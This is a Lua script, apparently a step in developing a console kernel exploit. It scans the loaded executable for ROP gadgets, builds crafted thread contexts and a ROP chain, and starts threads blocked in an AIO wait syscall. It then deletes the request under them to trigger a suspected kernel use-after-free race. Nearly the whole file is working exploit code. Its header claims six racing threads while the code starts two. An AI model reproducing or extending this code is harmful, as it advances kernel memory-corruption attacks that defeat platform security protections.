-- CRASH_CLASS: HIGH
-- PROBE 461a: race aio_multi_wait against aio delete
--
-- 460a proved 663 works: a pending request makes it sleep, a completed one
-- returns state 0x3.  Its dossier names "request completion racing waiter
-- registration" and waiter unlinking as the review edges, and the public
-- Relapse chain's kernel stage is a use-after-free race in this routine.
--
-- This probe arms that window: one pending request, six threads each
-- blocking in 663 on the same id, then the id is deleted while they sleep.
-- Each child ends with thr_exit (431) so nothing is left parked.

print("=== PROBE 461a: AIO WAIT RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function u64(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    if type(v) ~= "table" or not v.h then
        local n = tonumber(v) or 0
        if n < 0 then return -1 end
        return n
    end
    local h = tonumber(v.h) or 0
    local l = tonumber(v.l) or 0
    if h == -1 or h == 0xFFFFFFFF then
        if l == -1 or (l % 4294967296) == 0xFFFFFFFF then return -1 end
    end
    if h ~= 0 then return nil end
    return l
end
local function fmt(v) if v == nil then return "BIG" end return tostring(v) end
local function rd(a) return to_num(memory.read_dword(u64(0, to_num(a)))) end
local function wr(a, v) memory.write_dword(u64(0, to_num(a)), uint64(v)) end
local function wrq(a, v) memory.write_qword(u64(0, to_num(a)), uint64(v)) end

local sc_open  = make_syscall(5)
local sc_mmap  = make_syscall(477)
local SOCKPAIR = make_syscall(135)
local AIO_SUBMIT = make_syscall(669)
local AIO_DELETE = make_syscall(662)
local AIO_WAIT   = make_syscall(663)
local THR_CREATE = make_syscall(430)
local GETPID     = make_syscall(20)

print(string.format("canary getpid=%s", fmt(sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))))))

-- eboot text base through 593
local info = memory.alloc(0x300)
wr(info, 0x160)
local sc593 = make_syscall(593)
local rv593 = sgn(sc593(uint64(0), uint64(to_num(info)), uint64(0), uint64(0), uint64(0), uint64(0)))
local base_lo = rd(to_num(info) + 0x108)
local base_hi = rd(to_num(info) + 0x10C)
local base = u64(base_hi, base_lo)
print(string.format("593 rv=%s eboot=0x%X%08X", fmt(rv593), base_hi, base_lo))

-- the loader's syscall entry: past `mov rax, <num>`, so RAX selects the call
local sa = to_num(syscall.syscall_address or 0)
print(string.format("syscall_address=0x%X", sa))
local text = memory.read_buffer(base, 0x60000)
local pop_rax = nil
local park = nil
for i = 1, #text - 1 do
    if not pop_rax and text:byte(i) == 0x58 and text:byte(i + 1) == 0xC3 then
        pop_rax = base + (i - 1)
    end
end
for i = 1, #text - 1 do
    if text:byte(i) == 0xEB and text:byte(i + 1) == 0xFE then
        park = base + (i - 1)
        break
    end
end
print(string.format("pop_rax=0x%X park=0x%X", to_num(pop_rax), to_num(park)))
if not pop_rax or not park or sa == 0 then print("gadget scan failed"); return end

local PAGE = 0x4000
local p = to_num(sc_mmap(uint64(0), uint64(PAGE), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
if p <= 0 or p >= 0x800000000000 then print("mmap failed"); return end
for i = 0, PAGE - 1, 8 do memory.write_qword(u64(0, p + i), uint64(0)) end
local REQ = p
local IDS = p + 0x100
local TMO = p + 0x200
local DATA = p + 0x300
local RESULT = p + 0x400
local FDS = p + 0x500
local CTX = p + 0x600     -- 0x500 context
local STACKS = p + 0x1000 -- per-child stack area
local SSTATES = p + 0x3000 -- per-child state arrays

local function open_node(path, flags)
    local b = memory.alloc(#path + 1)
    for i = 1, #path do memory.write_byte(b + i - 1, path:byte(i)) end
    memory.write_byte(b + #path, 0)
    return sgn(make_syscall(5)(uint64(to_num(b)), uint64(flags), uint64(0), uint64(0), uint64(0), uint64(0)))
end

-- pending request: read 16 bytes from a socketpair nobody writes to
local pr = sgn(SOCKPAIR(uint64(1), uint64(1), uint64(0), uint64(FDS), uint64(0), uint64(0)))
local readfd, writefd = rd(FDS), rd(FDS + 4)
print(string.format("socketpair rv=%s read=%d write=%d", fmt(pr), readfd, writefd))
if pr ~= 0 or readfd <= 0 then print("socketpair failed"); return end

for i = 0, 0x27, 8 do wrq(REQ + i, 0) end
wrq(REQ + 0x08, 16)
wrq(REQ + 0x10, DATA)
wrq(REQ + 0x18, RESULT)
wr(REQ + 0x20, readfd)
wrq(IDS, 0)
local sub = sgn(AIO_SUBMIT(uint64(1), uint64(REQ), uint64(1), uint64(1), uint64(IDS), uint64(0)))
local id = rd(IDS)
print(string.format("669 rv=%s id=0x%X", fmt(sub), id))

local function make_waiter(n)
    local slot = (n - 1) * 0x40
    local ctx = CTX + slot
    local stk = STACKS + (n - 1) * 0x4000
    for i = 0, 0x4FF, 8 do memory.write_qword(u64(0, ctx + i), uint64(0)) end
    -- chain: [pop_rax][431 thr_exit][syscall_address][park]
    local top = stk + 0x4000 - 0x40
    wrq(top, pop_rax)
    wrq(top + 8, 431)
    wrq(top + 16, u64(0, sa))
    wrq(top + 24, park)
    -- gates and selectors
    wrq(ctx + 0x108, 0x480)
    wrq(ctx + 0x0d0, 0)
    wrq(ctx + 0x110, 0x10000)
    wrq(ctx + 0x0c0, 0x43)
    wrq(ctx + 0x0f0, 0x202)
    wrq(ctx + 0x0e0, u64(0, sa))      -- RIP: enter the syscall gadget
    wrq(ctx + 0x0f8, top)             -- RSP points at the first return address
    wrq(ctx + 0x100, 0x3b)            -- SS
    -- arguments for 663(ids, count, states, mode, timeout)
    wrq(ctx + 0x048, IDS)
    wrq(ctx + 0x050, 1)
    wrq(ctx + 0x058, SSTATES + (n - 1) * 0x40)
    wrq(ctx + 0x060, 0)
    wrq(ctx + 0x068, TMO)
    wrq(ctx + 0x078, 663)             -- RAX: syscall number
    local out = p + 0x3800 + (n - 1) * 8
    wrq(out, 0)
    local rv = sgn(THR_CREATE(uint64(ctx), uint64(out), uint64(0), uint64(0), uint64(0), uint64(0)))
    return rv, rd(out), rd(out + 4)
end

wr(TMO, 1500)
print("[A] two waiters on the same id")
for n = 1, 2 do
    local rv, tid = make_waiter(n)
    print(string.format("    child %d thr_create rv=%s tid=0x%X", n, fmt(rv), tid))
end

-- busy wait so the waiters are inside 663, then delete the id under them
local burn = 0
for i = 1, 400000 do burn = burn + i end
print("[B] deleting the id while the waiters sleep")
local del = sgn(AIO_DELETE(uint64(IDS), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("    662 delete rv=%s", fmt(del)))

burn = 0
for i = 1, 400000 do burn = burn + i end
print("[C] waiter states")
for n = 1, 2 do
    print(string.format("    child %d states=0x%X", n, rd(SSTATES + (n - 1) * 0x40)))
end

-- complete the request from the other end, which wakes anything still inside
local msg = memory.alloc(16)
for i = 0, 15 do memory.write_byte(msg + i, 0x42) end
local sent = sgn(syscall.write(uint64(writefd), uint64(to_num(msg)), uint64(16)))
print(string.format("[D] peer write=%s", fmt(sent)))
burn = 0
for i = 1, 400000 do burn = burn + i end
for n = 1, 2 do
    print(string.format("    child %d states=0x%X", n, rd(SSTATES + (n - 1) * 0x40)))
end

print("")
print("=== 461a DONE ===")
